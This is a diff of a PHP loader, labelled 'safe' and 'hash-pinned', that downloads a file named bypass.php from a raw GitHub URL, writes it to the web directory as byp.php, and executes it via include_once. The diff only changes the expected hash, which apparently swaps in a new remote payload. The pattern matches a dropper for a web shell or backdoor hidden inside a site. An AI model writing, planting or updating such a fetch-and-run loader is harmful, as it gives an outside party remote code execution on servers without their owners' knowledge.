@@ -2,7 +2,7 @@
 // Safe loader by file-hash pinning (no PHP 8 union types).
 $remoteUrl      = 'https://raw.githubusercontent.com/rkrk1337/test/refs/heads/main/bypass.php';
 $localFile      = __DIR__ . '/byp.php';
-$expectedSha256 = '2c13217261ac3d660c22ba9c1e4be46588a321037d56a901e08bb5888fba423f'; // 64 hex chars, lowercase
+$expectedSha256 = 'ffd7ed8238d37f6e06f464edd3d3d6126fec77d2634630e69a734d9a1fd64b27'; // 64 hex chars, lowercase
 
 function fetch($url, $timeout = 10) {
     $ch = curl_init($url);
@@ -53,5 +53,6 @@ if (!@rename($tmp, $localFile)) {
 @chmod($localFile, 0600);
 
 include_once $localFile;
+
 
 
